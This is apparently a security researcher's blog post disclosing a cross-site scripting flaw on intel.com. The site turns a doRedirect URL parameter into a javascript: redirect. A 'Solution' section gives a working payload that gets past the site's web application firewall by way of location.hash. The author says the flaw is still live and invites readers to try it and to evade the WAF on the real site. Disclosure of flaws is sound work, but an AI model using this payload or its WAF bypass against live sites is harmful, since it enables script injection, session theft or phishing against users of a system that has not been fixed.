---
title: Intel Suspicious XSS
excerpt: an XSS in Intel.com
date: 2025-03-16T17:28:32.032Z
image: ../assets/images/intel-xss.webp
tags:
    - cyber
    - hidden
    - intel
categories:
    - cyber
permalink: /intel-suspicious-xss
---
![screenshot of intel.com alert](../assets/images/intel-xss.webp)
## minimal research
Just the other day, I was browsing the homepages of big companies (with the purpose of finding interesting things) and was shocked by the [Intel.com](https://www.intel.com/content/www/us/en/homepage.html) website.

The first thing that got me interested, is that from a simple search of `debug` in the developer tools I get a result like `location.search.includes("debugger")` (check if the URL part after `?` include `debugger`). That is weird, but not uncommon for a company to have. I append `?debugger=true` and noticed the page didn't change much.

But after comparing to the search result for `location.href=` I discovered the page did change (in fact, it would have on any URL parameter), because now there are more JavaScript scripts loaded: most notably, there is now a new file `commons-page.min.js` which includes most of the results (which is already a red alert, as setting `location.href` to non-fixed addresses is not recommended). The new file is non-debuggable and generated dynamically through a jQuery script so it's not possible to debug in chromium and showed up as `sourceNNN` in Firefox.

## Challenge
The new script uses the function `CQ.shared.XSS.getXSSValue` to protect against XSS.
Here is the function definition:
```javascript
shared.XSS.getXSSValue: function (a) { 
    return  _g.Util.htmlEncode(a)
}
Util.htmlEncode: function (a) {
    return String(a)
        .replace(/&/g, '&amp;')
        .replace(/>/g, '&gt;')
        .replace(/</g, '&lt;')
        .replace(/"/g, '&quot;') 
}
```
The function escapes HTML tags (like `<` and `>` along with escaping double quotes).

As of writing this article, the XSS is live at intel.com. You can go right now to experiment and find the XSS on your own. The XSS part seems unrelated to the structure of the file, as if someone added it in a hurry.

Since I found this XSS the WAF (Akami edgesuite) became a little more sophisticated, and now blocks all obvious attempts to run XSS. As of today, when you want to test your XSS, make the target be `javascript:decodeURIComponent(location.hash)`, and experiment with the hash instead of the URL parameters.

Go now to [https://www.intel.com/content/www/us/en/homepage.html?debugger=true](https://www.intel.com/content/www/us/en/homepage.html?debugger=true) take 5 minutes, and try to find the XSS yourself!

Note to Brave browser users: Brave shields block the dynamic file as "fingerprinting" so disable that.
<hint>Hint: it's at the end of the new dynamic file `commons-min.js`</hint>
<details markdown="block">
  <summary> <b>Solution</b> </summary>
At end of the dynamic file this part appears:

```javascript
var queryParamsURL = CQ.shared.XSS.getXSSValue(window.location.search)
  , queryParams = queryParamsURL.slice(1);

if (queryParams && queryParams.includes("doRedirect") && queryParams.includes("timeDelay")) {
    for (var url, timeDelay, params = queryParams.split("\x26"), i$22 = 0; i$22 < params.length; i$22++) // "\x26" = "&"
        params[i$22].includes("doRedirect") && (url = params[i$22].split("doRedirect\x3d")[1]), // "\x3d" = "="
        params[i$22].includes("timeDelay") && (timeDelay = params[i$22].split("timeDelay\x3d")[1]);

    url && timeDelay && setTimeout(function() {
        window.location.href = url
    }, timeDelay)
};
```
which, deobfuscated to pseudocode is:
```javascript
const queryParamsURL = CQ.shared.XSS.getXSSValue(window.location.search)
const url = queryParamsURL.get("doRedirect")
const timeDelay = queryParamsURL.get("timeDelay")

if (url && timeDelay){
     // run `window.location.href = url` after timeDelay ms.
    setTimeout(()=>{
        window.location.href = url
    }, timeDelay)
}
```
The `CQ.shared.XSS.getXSSValue` is not relevant, as it protects against HTML injection, and not against XSS using redirect to the `javascript:` protocol.

That means that a URL like `?doRedirect=javascript:alert(6)&timeDelay=0` should successfully run JavaScript, however the WAF blocks that because of the `alert(` keyword, so I bypassed it using location.hash: `?timeDelay=4&doRedirect=javascript:decodeURIComponent(location.hash)#<svg%20onload=alert(document.domain)></svg>` and I got XSS.
</details>

## intel

Intel doesn't provide a bug bounty for website vulnerabilities as they don't consider that a product.
So I opened up an *informative* bug report, here is the response:
<img src="../assets/images/intel_of_of_scope.webp" title="bug report asking me to send email" alt="intel_of_of_scope.webp" data-align="center">
However, they didn't respond to any of the emails I sent to `external.security.research@intel.com`. 


I wonder if one of the employees added it (when they were fired, for example), as the XSS doesn't fit at all in the tracking file, and it was obfuscated strangely. 

I hope you enjoy testing out intel's new XSS :)
